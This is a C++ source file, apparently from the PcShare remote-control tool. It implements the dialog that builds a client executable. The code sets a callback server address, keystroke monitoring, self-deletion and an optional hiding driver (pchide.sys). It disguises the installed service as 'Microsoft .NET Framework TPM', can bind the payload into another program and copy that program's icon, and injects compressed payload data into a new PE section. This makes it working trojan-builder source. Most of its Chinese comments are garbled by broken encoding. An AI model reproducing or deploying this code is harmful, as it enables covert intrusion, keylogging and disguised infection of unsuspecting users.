// MyCreateClientDlg.cpp : implementation file
//

#include "stdafx.h"
#include "PcShare.h"
#include "Lzw.h"
#include "mycreateclientdlg.h"
#include "MyLoginDlg.h"
#include "MySelectTypeDlg.h"
#include "MyServerTran.h"
#include "MainFrm.h"

#ifdef _DEBUG
#define new DEBUG_NEW
#undef THIS_FILE
static char THIS_FILE[] = __FILE__;
#endif

/////////////////////////////////////////////////////////////////////////////
// CMyCreateClientDlg dialog

CMyCreateClientDlg::CMyCreateClientDlg(CWnd* pParent)
: CDialog(CMyCreateClientDlg::IDD, pParent)
{
	//{{AFX_DATA_INIT(CMyCreateClientDlg)
	m_Port = _T("");
	m_BakUrl = _T("");
	m_Title = _T("");
	m_Group = PS_PUTONGKEHUZU;
	m_IsUrl = FALSE;
	m_IsDel = TRUE;
	m_IsSys = FALSE;
	m_IsKey = FALSE;
	m_ServiceTitle = _T("�Զ�����");
	m_Sleeptime = _T("10");
	m_ServiceName = _T("�Զ�����");
	m_ServiceView = _T("�Զ�����");
	m_Process = _T("SYSTEM32");
	m_AddFileName = _T("");
	//}}AFX_DATA_INIT

	pDllFileData = NULL;
	pExeFileData = NULL;
	pSysFileData = NULL;
	pComFileData = NULL;
	pStrFileData = NULL;

	//�ļ�����
	m_ExeSize = 0;
	m_DllSize = 0;
	m_SysSize = 0;
	m_ComSize = 0;
	m_StrSize = 0;
	m_CurSorStatus = FALSE;
}

CMyCreateClientDlg::~CMyCreateClientDlg()
{
	if(pStrFileData != NULL)
	{
		delete [] pStrFileData;
	}

	if(pDllFileData != NULL)
	{
		delete [] pDllFileData;
	}

	if(pExeFileData != NULL)
	{
		delete [] pExeFileData;
	}

	if(pSysFileData != NULL)
	{
		delete [] pSysFileData;
	}

	if(pComFileData != NULL)
	{
		delete [] pComFileData;
	}
}

void CMyCreateClientDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialog::DoDataExchange(pDX);
	//{{AFX_DATA_MAP(CMyCreateClientDlg)
	DDX_Control(pDX, IDC_COMBO_IPLIST, m_IpList);
	DDX_Text(pDX, IDC_EDIT_PORT, m_Port);
	DDV_MaxChars(pDX, m_Port, 5);
	DDX_Text(pDX, IDC_EDIT_BAK_URL, m_BakUrl);
	DDV_MaxChars(pDX, m_BakUrl, 255);
	DDX_Text(pDX, IDC_EDIT_TITLE, m_Title);
	DDV_MaxChars(pDX, m_Title, 63);
	DDX_Text(pDX, IDC_EDIT_GROUP, m_Group);
	DDV_MaxChars(pDX, m_Group, 31);
	DDX_Check(pDX, IDC_CHECK_URL, m_IsUrl);
	DDX_Check(pDX, IDC_CHECK_ISDEL, m_IsDel);
	DDX_Check(pDX, IDC_CHECK_ISSYS, m_IsSys);
	DDX_Check(pDX, IDC_CHECK_ISKEY, m_IsKey);
	DDX_Text(pDX, IDC_EDIT_SERVICE_TITLE, m_ServiceTitle);
	DDV_MaxChars(pDX, m_ServiceTitle, 255);
	DDX_Text(pDX, IDC_EDIT_SERVICE_NAME, m_ServiceName);
	DDV_MaxChars(pDX, m_ServiceName, 23);
	DDX_Text(pDX, IDC_EDIT_SERVICE_VIEW, m_ServiceView);
	DDV_MaxChars(pDX, m_ServiceView, 31);
	DDX_Text(pDX, IDC_EDIT_SLEEP, m_Sleeptime);
	DDV_MaxChars(pDX, m_Sleeptime, 5);
	DDX_CBString(pDX, IDC_COMBO_PID, m_Process);
	DDX_Text(pDX, IDC_EDIT_ADD_FILE_NAME, m_AddFileName);
	DDV_MaxChars(pDX, m_AddFileName, 255);
	//}}AFX_DATA_MAP
}

BEGIN_MESSAGE_MAP(CMyCreateClientDlg, CDialog)
	//{{AFX_MSG_MAP(CMyCreateClientDlg)
	ON_BN_CLICKED(IDC_BUTTON_CREATE, OnButtonCreate)
	ON_BN_CLICKED(IDC_BUTTON_FLUSH, OnButtonFlush)
	ON_BN_CLICKED(IDC_CHECK_URL, OnCheckUrl)
	ON_BN_CLICKED(IDC_CHECK_ISDEL, OnCheckIsDel)
	ON_BN_CLICKED(IDC_CHECK_ISSYS, OnCheckIsSys)
	ON_BN_CLICKED(IDC_CHECK_ISKEY, OnCheckIsKey)
	ON_BN_CLICKED(IDC_BUTTON_ADDFILE, OnAddFile)
	ON_WM_SETCURSOR()
	//}}AFX_MSG_MAP
	ON_MESSAGE(WM_SETMYCURSOR, OnSetMyCursor)
END_MESSAGE_MAP()

/////////////////////////////////////////////////////////////////////////////
// CMyCreateClientDlg message handlers

void GetSysFileName(TCHAR* pFileName)
{
	TCHAR m_SysFile[256] = {0};
	GetModuleFileName(NULL, m_SysFile, 256);
	TCHAR* pFind = StrRChr(m_SysFile, NULL, _T('\\'));
	if(pFind != NULL)
	{
		*(pFind + 1) = 0;
		lstrcat(m_SysFile, _T("UPDATE\\"));
		lstrcat(m_SysFile, pFileName);
	}
	lstrcpy(pFileName, m_SysFile);
}

BOOL GetMySource(TCHAR* pFileName, BYTE** pFileData, DWORD& nFileLen)
{
	CFile m_File;
	if(!m_File.Open(pFileName, CFile::modeRead))
	{
		return FALSE;
	}
	nFileLen = m_File.GetLength();
	*pFileData = new BYTE[nFileLen];
	m_File.Read(*pFileData, nFileLen);
	m_File.Close();
	return TRUE;
}

BOOL CMyCreateClientDlg::OnInitDialog() 
{
	CDialog::OnInitDialog();

	TCHAR m_sMainPort[20] = {0};
	GetPrivateProfileString(PS_SHEZHI, _T("�������Ӷ˿�"), _T("80"), m_sMainPort,10,GetIniFileName());
	m_Port = m_sMainPort;

	TCHAR m_sBakUrlName[256] = {0};
	GetPrivateProfileString(PS_SHEZHI, _T("����URL����"), _T("ָ��һ����תURL�ļ�"), m_sBakUrlName, 255, GetIniFileName());
	m_BakUrl = m_sBakUrlName;

	TCHAR m_sTitle[256] = {0};
	GetPrivateProfileString(PS_SHEZHI, _T("�����ƶ˱�ʶ"), _T("Ĭ�ϼ������"), m_sTitle, 255, GetIniFileName());
	m_Title = m_sTitle;

	TCHAR sIsUrl[20] = {0};
	GetPrivateProfileString(PS_SHEZHI, _T("�Ƿ񱸷�URL"), _T("0"), sIsUrl, 19, GetIniFileName());
	m_IsUrl = StrToInt(sIsUrl);

	TCHAR sIsDel[20] = {0};
	GetPrivateProfileString(PS_SHEZHI, _T("�Ƿ���ɾ��"), _T("1"), sIsDel, 19, GetIniFileName());
	m_IsDel = StrToInt(sIsDel);

	TCHAR sIsKey[20] = {0};
	GetPrivateProfileString(PS_SHEZHI, _T("�Ƿ��������̼��"), _T("0"), sIsKey, 19, GetIniFileName());
	m_IsKey = StrToInt(sIsKey);

	TCHAR sIsSys[20] = {0};
	GetPrivateProfileString(PS_SHEZHI, _T("�Ƿ�������������"), _T("0"), sIsSys, 19, GetIniFileName());
	m_IsSys = StrToInt(sIsSys);

	TCHAR sSleeptime[20] = {0};
	GetPrivateProfileString(PS_SHEZHI, _T("��������ʱ��"), _T("10"), sSleeptime, 19, GetIniFileName());
	m_Sleeptime = sSleeptime;

	TCHAR m_sServiceTitle[256] = {0};
	GetPrivateProfileString(PS_SHEZHI, _T("��������"), _T("�Զ�����"), m_sServiceTitle, 255, GetIniFileName());
	m_ServiceTitle = m_sServiceTitle;

	TCHAR m_sServiceName[256] = {0};
	GetPrivateProfileString(PS_SHEZHI, _T("��������"), _T("�Զ�����"), m_sServiceName, 255, GetIniFileName());
	m_ServiceName = m_sServiceName;

	TCHAR m_sServiceView[256] = {0};
	GetPrivateProfileString(PS_SHEZHI, _T("������ʾ����"), _T("�Զ�����"), m_sServiceView, 255, GetIniFileName());
	m_ServiceView = m_sServiceView;

	TCHAR m_sProcess[256] = {0};
	GetPrivateProfileString(PS_SHEZHI, _T("�ͷ�Ŀ¼"), _T("SYSTEM32"), m_sProcess, 255, GetIniFileName());
	m_Process = m_sProcess;

	TCHAR m_sGroup[256] = {0};
	GetPrivateProfileString(PS_PUTONGKEHUZU, _T("��������"), PS_PUTONGKEHUZU, m_sGroup, 255, GetIniFileName());
	m_Group = m_sGroup;

	TCHAR m_TmpAddrList[1024] = {0};
	lstrcpy(m_TmpAddrList, GetIpList());
	TCHAR* pStart = m_TmpAddrList;
	while(1)
	{
		TCHAR* pFind = StrChr(pStart, _T('-'));
		if(pFind == NULL)
		{
			m_IpList.AddString(pStart);
			break;
		}
		*pFind = 0;
		m_IpList.AddString(pStart);
		pStart = pFind + 1;
	}
	m_IpList.SetCurSel(0);

	UpdateData(FALSE);
	OnCheckUrl();
	return TRUE;  
}

/*
BOOL AddDataToPe(BYTE* pSaveData, DWORD DataLen, BYTE* pPeData, DWORD nPeLen, LPCTSTR pPeFile)
{
	WriteMyFile(pPeFile, pPeData, nPeLen);

	//��ʼ�滻��Դ
	HANDLE hFile = BeginUpdateResource(pPeFile, FALSE);
	if(hFile == NULL)
	{
		return FALSE;
	}

	//�����ļ�
	if(!UpdateResource( hFile, 
						MAKEINTRESOURCE(2),
						MAKEINTRESOURCE(400), 
						MAKELANGID(LANG_CHINESE, SUBLANG_ARABIC_SAUDI_ARABIA),
						pSaveData,
						DataLen))

	{
		::MessageBox(NULL, _T("������Դʧ��"), _T("����"), MB_OK);
		return FALSE;
	}

	//������Դ
	return EndUpdateResource(hFile, FALSE);
}
*/

BOOL AddDataToPe(BYTE* pSaveData, DWORD DataLen, BYTE* pPeData, DWORD nPeLen, LPCTSTR pPeFile)
{
	// PEͷƫ��
	DWORD dwPE_Header_OffSet = *(DWORD *)(pPeData + 0x3C);
	
	// ȡ�� PE ͷ
	IMAGE_NT_HEADERS *pPE_Header = (IMAGE_NT_HEADERS *)(pPeData + dwPE_Header_OffSet);
	
	// �ж��Ƿ���Ч��PE�ļ�
	if (pPE_Header->Signature != IMAGE_NT_SIGNATURE)
	{
		return FALSE;
	}

	// �����½ڵ�ƫ�Ƶ�ַ
	DWORD dwMySectionOffSet = dwPE_Header_OffSet;
	dwMySectionOffSet += 4;		//sizeof("PE\0\0")
	dwMySectionOffSet += sizeof(IMAGE_FILE_HEADER);
	dwMySectionOffSet += sizeof(IMAGE_OPTIONAL_HEADER32);
	dwMySectionOffSet += pPE_Header->FileHeader.NumberOfSections * 0x28;	//NumberOfSections * sizeof(IMAGE_SECTION_HEADER)

	// ���PEͷ�Ŀռ乻������
	if(dwMySectionOffSet + 0x28 > pPE_Header->OptionalHeader.SizeOfHeaders)
	{
		// ��� PE ͷ�Ŀռ䲻���ʧ�ܣ�
		return FALSE;
	}

	// �½�
	IMAGE_SECTION_HEADER *pNewSec = (IMAGE_SECTION_HEADER *)(pPeData + dwMySectionOffSet);

	// ��ȡ�½�λ�ô������ݣ�������ȫ0
	for (int i = 0; i != 0x28; ++i)
	{
		BYTE bt = *((PBYTE)pNewSec + i);
		if (bt)
		{
			// ��0��˵������ռ��Ѿ�����ʲô�ӳټ���ռ����
			// ֻ��Ĩ��image_directory_entry_bound_im���ڳ��ռ䡣
			memset(pPeData + dwPE_Header_OffSet + 0xD0, 0, 8);
			break;
		}
	}
	
	pNewSec->Misc.VirtualSize = DataLen;
	
	// �½ڵ�RVA
	pNewSec->VirtualAddress = pPE_Header->OptionalHeader.SizeOfImage;

	//SizeOfRawData��EXE�ļ����Ƕ��뵽FileAlignMent����������ֵ
	pNewSec->SizeOfRawData = DataLen;
	pNewSec->SizeOfRawData /= pPE_Header->OptionalHeader.FileAlignment;
	pNewSec->SizeOfRawData++;
	pNewSec->SizeOfRawData *= pPE_Header->OptionalHeader.FileAlignment;
	
	// �����½ڵ� PointerToRawData
	pNewSec->PointerToRawData = nPeLen;
	
	// �����½ڵ�����
	pNewSec->Characteristics = 0x40000040;		//�ɶ�,���ѳ�ʼ��

	// ����NumberOfSections
	pPE_Header->FileHeader.NumberOfSections++;

	// ����SizeOfImage
	pPE_Header->OptionalHeader.SizeOfImage += 
		(pNewSec->Misc.VirtualSize/pPE_Header->OptionalHeader.SectionAlignment + 1) * 
		pPE_Header->OptionalHeader.SectionAlignment;


	// ���浽�ļ�
	HANDLE hFile = CreateFile(pPeFile,GENERIC_WRITE,FILE_SHARE_READ,NULL,CREATE_ALWAYS,FILE_ATTRIBUTE_NORMAL,NULL);
	if(hFile == INVALID_HANDLE_VALUE)
	{
		return FALSE;
	}
	
	DWORD dw = 0;
	if (!WriteFile(hFile, pPeData, nPeLen, &dw, NULL)) {
		CloseHandle(hFile);
		return FALSE;
	}
	
	if(!WriteFile(hFile, pSaveData, DataLen, &dw, NULL)) {
		CloseHandle(hFile);
		return FALSE;
	}

	// ����N�õ�bug�㣺
	int extraLen = pNewSec->SizeOfRawData - DataLen;
	if (extraLen != 0) {
		BYTE * pExtra = new BYTE[extraLen];
		memset(pExtra, 0, extraLen);
		if(!WriteFile(hFile, pExtra, extraLen, &dw, NULL)) {
			delete [] pExtra;
			CloseHandle(hFile);
			return FALSE;
		}
		delete [] pExtra;
	}
	CloseHandle(hFile);
	return TRUE;
}


BOOL CMyCreateClientDlg::SaveFileData()
{
	//����
	WritePrivateProfileString(PS_SHEZHI, _T("����URL����"), m_BakUrl, GetIniFileName());
	WritePrivateProfileString(PS_SHEZHI, _T("�����ƶ˱�ʶ"), m_Title, GetIniFileName());
	WritePrivateProfileString(PS_SHEZHI, _T("�������Ӷ˿�"), m_Port, GetIniFileName());
	WritePrivateProfileString(PS_SHEZHI, _T("��������"), m_Group, GetIniFileName());
	WritePrivateProfileString(PS_SHEZHI, _T("��������"), m_ServiceTitle, GetIniFileName());
	WritePrivateProfileString(PS_SHEZHI, _T("��������"), m_ServiceName, GetIniFileName());
	WritePrivateProfileString(PS_SHEZHI, _T("������ʾ����"), m_ServiceView, GetIniFileName());
	WritePrivateProfileString(PS_SHEZHI, _T("��������ʱ��"), m_Sleeptime, GetIniFileName());
	WritePrivateProfileString(PS_SHEZHI, _T("�ͷ�Ŀ¼"), m_Process, GetIniFileName());

	OPENFILENAME OpenFileName = {0};
	TCHAR szFile[MAX_PATH] = {0};
  	TCHAR szFilter[1024] = {0};
	lstrcpy(szFilter, _T("��ִ���ļ�(*.exe)"));
	lstrcpy(szFilter + lstrlen(szFilter) + 1, _T("*.exe"));
	OpenFileName.lStructSize       = sizeof(OPENFILENAME);
    OpenFileName.hwndOwner         = GetSafeHwnd();
	OpenFileName.lpstrFilter       = szFilter;
    OpenFileName.lpstrCustomFilter = NULL;
    OpenFileName.nMaxCustFilter    = 0;
    OpenFileName.nFilterIndex      = 0;
    OpenFileName.lpstrFile         = szFile;
    OpenFileName.nMaxFile          = sizeof(szFile);
    OpenFileName.lpstrFileTitle    = NULL;
    OpenFileName.nMaxFileTitle     = 0;
    OpenFileName.lpstrInitialDir   = NULL;
    OpenFileName.lpstrTitle        = _T("���ɱ����ƶ˿�ִ���ļ�");
    OpenFileName.nFileOffset       = 0;
    OpenFileName.nFileExtension    = 0;
    OpenFileName.lpstrDefExt       = _T("exe");
    OpenFileName.Flags             = OFN_EXPLORER | OFN_HIDEREADONLY | OFN_OVERWRITEPROMPT;
	if(!GetSaveFileName(&OpenFileName))
	{
		return FALSE;
	}

	//����������Ϣ
	PSDLLINFO m_InitInfo = {0};

	//////////////////////////////////////////////////////////////////////////
	// �޸� [9/19/2007 zhaiyinwei]
#ifdef UNICODE
	wchar_t	 tmpBuf[256];
	memset(tmpBuf,0,256*sizeof(wchar_t));
	m_IpList.GetWindowText(tmpBuf,120);
	MyServerTran tran;
	tran.Convert2ClientANSI(tmpBuf,wcslen(tmpBuf),GetACP());
	strcpy(m_InitInfo.m_ServerAddr,(char*)tmpBuf);
#else
	m_IpList.GetWindowText(m_InitInfo.m_ServerAddr,120);
#endif
	//////////////////////////////////////////////////////////////////////////

	m_InitInfo.m_ServerPort = (WORD) (StrToInt((LPCTSTR) m_Port));
	m_InitInfo.m_DelayTime = StrToInt((LPCTSTR) m_Sleeptime) * 1000;
	m_InitInfo.m_IsDel = m_IsDel;
	m_InitInfo.m_IsKeyMon = m_IsKey;

	//////////////////////////////////////////////////////////////////////////
	// �޸� [9/19/2007 zhaiyinwei]
#ifdef UNICODE
	lstrcpy(tmpBuf,m_Group);
	tran.Convert2ClientANSI(tmpBuf,wcslen(tmpBuf),GetACP());
	strcpy(m_InitInfo.m_Group,(char*)tmpBuf);
#else
	lstrcpy(m_InitInfo.m_Group, m_Group);
#endif
	//////////////////////////////////////////////////////////////////////////

	if(m_BakUrl != _T("ָ��һ����תURL�ļ�") && m_IsUrl)
	{
		TCHAR m_TmpStr[256] = {0};
		lstrcpy(m_TmpStr, m_BakUrl);
		CharLower(m_TmpStr);
		int len = lstrlen(_T("http://"));

		// �޸� [9/19/2007 zhaiyinwei]
#ifdef UNICODE
		if(memcmp(m_TmpStr, _T("http://"), len))
		{
			lstrcpy(tmpBuf, m_BakUrl);
		}
		else
		{
			lstrcpy(tmpBuf, &m_TmpStr[len]);
		}
		tran.Convert2ClientANSI(tmpBuf,wcslen(tmpBuf),GetACP());
		strcpy(m_InitInfo.m_DdnsUrl,(char*)tmpBuf);
#else
		if(memcmp(m_TmpStr, _T("http://"), len))
			lstrcpy(m_InitInfo.m_DdnsUrl, m_BakUrl);
		else
			lstrcpy(m_InitInfo.m_DdnsUrl, &m_TmpStr[len]);
#endif
	}

	if(m_Title != _T("Ĭ�ϼ������"))
	{
		// �޸� [9/19/2007 zhaiyinwei]
#ifdef UNICODE
		lstrcpy(tmpBuf, m_Title);
		tran.Convert2ClientANSI(tmpBuf,wcslen(tmpBuf),GetACP());
		strcpy(m_InitInfo.m_Title,(char*)tmpBuf);
#else
		lstrcpy(m_InitInfo.m_Title, m_Title);
#endif
	}

	//��������
	if(m_ServiceTitle == _T("�Զ�����"))
	{
		// �޸� [9/19/2007 zhaiyinwei]
		//lstrcpy(m_InitInfo.m_ServiceTitle, _T("Microsoft .NET Framework TPM"));
		strcpy(m_InitInfo.m_ServiceTitle,"Microsoft .NET Framework TPM");
	}
	else
	{
		// �޸� [9/19/2007 zhaiyinwei]
#ifdef UNICODE
		lstrcpy(tmpBuf, m_ServiceTitle);
		tran.Convert2ClientANSI(tmpBuf,wcslen(tmpBuf),GetACP());
		strcpy(m_InitInfo.m_ServiceTitle,(char*)tmpBuf);
#else
		lstrcpy(m_InitInfo.m_ServiceTitle, m_ServiceTitle);
#endif
	}

	if(m_ServiceName == _T("�Զ�����"))
	{
		//Service����
		srand((unsigned) time(NULL));
		for(int i = 0; i < 6; i++)
		{
			m_InitInfo.m_ServiceName[i] = rand()%26;
			m_InitInfo.m_ServiceName[i] += 97;
		}
//		m_InitInfo.m_ServiceName[0] = 'Y';
	}
	else
	{
		//
#ifdef UNICODE
		lstrcpy(tmpBuf, m_ServiceName);
		tran.Convert2ClientANSI(tmpBuf,wcslen(tmpBuf),GetACP());
		strcpy(m_InitInfo.m_ServiceName,(char*)tmpBuf);
#else
		lstrcpy(m_InitInfo.m_ServiceName, m_ServiceName);
#endif
	}

	//��ʾ����
	if(m_ServiceView == _T("�Զ�����"))
	{
		strcpy(m_InitInfo.m_ServiceView, m_InitInfo.m_ServiceName);
	}
	else
	{
		//
#ifdef UNICODE
		lstrcpy(tmpBuf, m_ServiceView);
		tran.Convert2ClientANSI(tmpBuf,wcslen(tmpBuf),GetACP());
		strcpy(m_InitInfo.m_ServiceView,(char*)tmpBuf);
#else	
		lstrcpy(m_InitInfo.m_ServiceView, m_ServiceView);
#endif
	}

	if(m_Process == _T("SYSTEM32"))
	{
		m_InitInfo.m_DirAddr = 0;
	}
	else
	{
		m_InitInfo.m_DirAddr = 1;
	}

	//����汾
	lstrcpyA(m_InitInfo.m_SoftVer, PS_VER_INFO);

	//��������
	TCHAR m_PassWord[32] = {0};
	GetPrivateProfileString(PS_SHEZHI, _T("������������"), _T(""), m_PassWord, 32, GetIniFileName());
	m_InitInfo.m_PassWord = (DWORD) StrToInt(m_PassWord);

	//��������,����dll����
	srand((unsigned) time(NULL));
	for(DWORD i = 0; i < 8; i++)
	{
		m_InitInfo.m_SysName[i] = rand()%26;
		m_InitInfo.m_SysName[i] += 97;
	}
	m_InitInfo.m_SysName[0] = 'x';

	//�������κ�
	srand((unsigned) time(NULL));
	for(i = 0; i < 20; i++)
	{
		m_InitInfo.m_CreateFlag += rand();
	}

	FCLzw lzw;
	BYTE* pZipSysFileData = NULL;
	BYTE* pZipDllFileData = NULL;
	BYTE* pZipComFileData = NULL;

	//�޸�DLL�����ļ�����
	ChangeDllExportFunc(pDllFileData, m_DllSize);

	//DLL����
	pZipDllFileData = new BYTE[m_DllSize * 2 + 65535];
	memset(pZipDllFileData, 0, m_DllSize * 2 + 65535);
	lzw.PcZip(pDllFileData, pZipDllFileData, &m_DllSize);

	//SYS����
	if(m_IsSys)
	{
		pZipSysFileData = new BYTE[m_SysSize * 2 + 65535];
		memset(pZipSysFileData, 0, m_SysSize * 2 + 65535);
		lzw.PcZip(pSysFileData, pZipSysFileData, &m_SysSize);
	}
	else
	{
		m_SysSize = 0;
	}

	if(!m_AddFileName.IsEmpty())
	{
		//��������
		pZipComFileData = new BYTE[m_ComSize * 2 + 65535];
		memset(pZipComFileData, 0, m_ComSize * 2 + 65535);
		lzw.PcZip(pComFileData, pZipComFileData, &m_ComSize);
	}

	//ѹ��������ݳ���
	m_InitInfo.m_DllFileLen = m_DllSize;
	m_InitInfo.m_SysFileLen = m_SysSize;
	m_InitInfo.m_ComFileLen = m_ComSize;

	//ѹ���ṹ��Ϣ
	DWORD nInfoSize = sizeof(PSDLLINFO);
	BYTE* pInfoZipData = new BYTE[nInfoSize * 2 + 65535];
	memset(pInfoZipData, 0, nInfoSize * 2 + 65535);
	lzw.PcZip((BYTE*) &m_InitInfo, pInfoZipData, &nInfoSize);

	//ѹ���ִ�
	BYTE* pStrZipData = new BYTE[m_StrSize * 2 + 65535];
	memset(pStrZipData, 0, m_StrSize * 2 + 65535);
	lzw.PcZip(pStrFileData, pStrZipData, &m_StrSize);

	//����������
	DWORD nSaveSize = sizeof(PSSAVEFILEINFO) + m_StrSize + m_DllSize + m_SysSize + m_ComSize + nInfoSize;

	PSSAVEFILEINFO m_SaveFileInfo = {0};
	
	//���������־
	m_SaveFileInfo.m_FindFlag = PS_FIND_FLAG;

	//�ִ����ݳ���
	m_SaveFileInfo.m_StringLen = m_StrSize;

	//�ṹ����
	m_SaveFileInfo.m_InfoLen = nInfoSize;

	//DLL�ļ�����
	m_SaveFileInfo.m_DllFileLen = m_DllSize;

	//SYS�ļ�����
	m_SaveFileInfo.m_SysFileLen = m_SysSize;

	//�ϲ��ļ�����
	m_SaveFileInfo.m_ComFileLen = m_ComSize;
	
	//���ٻ���
	BYTE* pTmpData = new BYTE[nSaveSize];
	BYTE* pData = pTmpData;

	//������Ϣͷ
	memcpy(pData, &m_SaveFileInfo, sizeof(m_SaveFileInfo));
	pData += sizeof(PSSAVEFILEINFO);

	//�����ִ���Դ
	memcpy(pData, pStrZipData, m_StrSize);
	pData += m_StrSize;
	
	//������Ϣ����
	memcpy(pData, pInfoZipData, nInfoSize);
	pData += nInfoSize;

	//DLL����
	memcpy(pData, pZipDllFileData, m_DllSize);
	pData += m_DllSize;

	//�����ļ�����
	if(m_SysSize > 0)
	{
		memcpy(pData, pZipSysFileData, m_SysSize);
		pData += m_SysSize;
	}

	//�����ļ�����
	if(m_ComSize > 0)
	{
		memcpy(pData, pZipComFileData, m_ComSize);
	}

	//�������ݵ�exe�ļ�
	BOOL bRet = AddDataToPe(pTmpData, nSaveSize, pExeFileData, m_ExeSize, szFile);
	delete [] pTmpData;
	delete [] pInfoZipData;
	delete [] pZipDllFileData;
	delete [] pStrZipData;
	if(pZipSysFileData != NULL)
	{
		delete [] pZipSysFileData;
	}
	if(pZipComFileData != NULL)
	{
		delete [] pZipComFileData;
	}
	if(!bRet)
	{
		MessageBox(_T("�޷������ļ�"), PS_WARNING, MB_OKCANCEL|MB_ICONWARNING);
		return FALSE;
	}

	//�ϲ��ļ��޸�ͼ��
	if(!m_AddFileName.IsEmpty())
	{
		UpdateIcon(m_AddFileName, szFile);
	}
	return TRUE;
}

void CMyCreateClientDlg::OnButtonCreate() 
{
	//�������
	UpdateData();

	TCHAR m_FileName[256] = {0};
	lstrcpy(m_FileName, _T("pcmake.dll"));
	GetSysFileName(m_FileName);
	if(!GetMySource(m_FileName, &pDllFileData, m_DllSize) || m_DllSize == 0)
	{
		TCHAR m_Text[256] = {0};
		wsprintf(m_Text, _T("�ļ�%s��ʧ�����𻵣�����������"), m_FileName);
		MessageBox(m_Text, PS_WARNING, MB_OKCANCEL|MB_ICONWARNING);
		return;
	}

	lstrcpy(m_FileName, _T("pcinit.exe"));
	GetSysFileName(m_FileName);
	if(!GetMySource(m_FileName, &pExeFileData, m_ExeSize) || m_ExeSize == 0)
	{
		TCHAR m_Text[256] = {0};
		wsprintf(m_Text, _T("�ļ�%s��ʧ�����𻵣�����������"), m_FileName);
		MessageBox(m_Text, PS_WARNING, MB_OKCANCEL|MB_ICONWARNING);
		return;
	}

	if(m_IsSys)
	{
		lstrcpy(m_FileName, _T("pchide.sys"));
		GetSysFileName(m_FileName);
		if(!GetMySource(m_FileName, &pSysFileData, m_SysSize) || m_SysSize == 0)
		{
			TCHAR m_Text[256] = {0};
			wsprintf(m_Text, _T("�ļ�%s��ʧ�����𻵣�����������"), m_FileName);
			MessageBox(m_Text, PS_WARNING, MB_OKCANCEL|MB_ICONWARNING);
			return;
		}
	}

	//�����ļ�
	if(!m_AddFileName.IsEmpty())
	{
		lstrcpy(m_FileName, m_AddFileName);
		if(!GetMySource(m_FileName, &pComFileData, m_ComSize) || m_ComSize == 0)
		{
			TCHAR m_Text[256] = {0};
			wsprintf(m_Text, _T("�ļ�%s��ʧ�����𻵣�������ָ��Ŀ�������ļ�"), m_FileName);
			MessageBox(m_Text, PS_WARNING, MB_OKCANCEL|MB_ICONWARNING);
			return;
		}
	}

	//�ִ���Դ
	DWORD nStringLen = 0;
	LPBYTE pStringData  = GetMyExeSource(_T("DLLSTRING"), _T("MOD"), nStringLen);
	if(pStringData == NULL)
	{
		MessageBox(_T("�ִ�֧Ԯ��ʧ��"), PS_WARNING, MB_OKCANCEL|MB_ICONWARNING);
		return;
	}
	m_StrSize = nStringLen + 1;
	pStrFileData = new BYTE[m_StrSize];
	memcpy(pStrFileData, pStringData, nStringLen);

	//�����ļ�
	SaveFileData();
}

void CMyCreateClientDlg::OnButtonFlush() 
{
	UpdateData();
	TCHAR m_IpStr[65535] = {0};
	BOOL bRet = GetLoginInfo(m_BakUrl.LockBuffer(), m_IpStr);
	if(bRet)
	{
		MessageBox(m_IpStr, _T("����Url���ݳɹ�"), MB_OK);
	}
	else
	{
		MessageBox(_T("Url�����ڻ�������ͨ�Ŵ���"), _T("ȡUrl����ʧ��"), MB_OK);
	}
}

void CMyCreateClientDlg::OnCheckUrl() 
{
	UpdateData();

	if(m_IsUrl)
	{
		GetDlgItem(IDC_EDIT_BAK_URL)->EnableWindow(TRUE);
		GetDlgItem(IDC_BUTTON_FLUSH)->EnableWindow(TRUE);
	}
	else
	{
		GetDlgItem(IDC_EDIT_BAK_URL)->EnableWindow(FALSE);
		GetDlgItem(IDC_BUTTON_FLUSH)->EnableWindow(FALSE);
	}
	TCHAR sIsUrl[20] = {0};
	wsprintf(sIsUrl, _T("%d"), m_IsUrl);
	WritePrivateProfileString(PS_SHEZHI, _T("�Ƿ񱸷�URL"), sIsUrl, GetIniFileName());
}

void CMyCreateClientDlg::OnCheckIsDel() 
{
	UpdateData();
	TCHAR sIsDel[20] = {0};
	wsprintf(sIsDel, _T("%d"), m_IsDel);
	WritePrivateProfileString(PS_SHEZHI, _T("�Ƿ���ɾ��"), sIsDel, GetIniFileName());
}

void CMyCreateClientDlg::OnCheckIsSys() 
{
	UpdateData();
	TCHAR sIsSys[20] = {0};
	wsprintf(sIsSys, _T("%d"), m_IsSys);
	WritePrivateProfileString(PS_SHEZHI, _T("�Ƿ�������������"), sIsSys, GetIniFileName());
}

void CMyCreateClientDlg::OnCheckIsKey() 
{
	UpdateData();
	TCHAR sIsKey[20] = {0};
	wsprintf(sIsKey, _T("%d"), m_IsKey);
	WritePrivateProfileString(PS_SHEZHI, _T("�Ƿ��������̼��"), sIsKey, GetIniFileName());
}

void CMyCreateClientDlg::OnAddFile() 
{
	//*.exe
	TCHAR m_TempStr[256] = {0};
	m_TempStr[0] = L'*';
	m_TempStr[1] = L'.';
	m_TempStr[2] = L'e';
	m_TempStr[3] = L'x';
	m_TempStr[4] = L'e';
	m_TempStr[5] = 0x00;

	OPENFILENAME OpenFileName = {0};
	TCHAR szFile[MAX_PATH] = {0};
	TCHAR szFileName[MAX_PATH] = {0};
  	TCHAR szFilter[1024] = {0};
	lstrcpy(szFilter, m_TempStr);
	lstrcpy(szFilter + lstrlen(szFilter) + 1, m_TempStr);
	OpenFileName.lStructSize       = sizeof(OPENFILENAME);
    OpenFileName.hwndOwner         = GetSafeHwnd();
	OpenFileName.lpstrFilter       = szFilter;
    OpenFileName.lpstrCustomFilter = NULL;
    OpenFileName.nMaxCustFilter    = 0;
    OpenFileName.nFilterIndex      = 0;
    OpenFileName.lpstrFile         = szFile;
    OpenFileName.nMaxFile          = sizeof(szFile);
    OpenFileName.lpstrFileTitle    = szFileName;
    OpenFileName.nMaxFileTitle     = sizeof(szFileName);
    OpenFileName.lpstrInitialDir   = NULL;
    OpenFileName.lpstrTitle        = _T("");
    OpenFileName.nFileOffset       = 0;
    OpenFileName.nFileExtension    = 0;
    OpenFileName.lpstrDefExt       = NULL;
    OpenFileName.Flags             = OFN_EXPLORER | OFN_HIDEREADONLY | OFN_OVERWRITEPROMPT;
	if(!GetOpenFileName(&OpenFileName))
	{
		return;
	}
	m_AddFileName = szFile;
	UpdateData(FALSE);
}

BOOL CMyCreateClientDlg::OnSetCursor(CWnd* pWnd, UINT nHitTest, UINT message) 
{
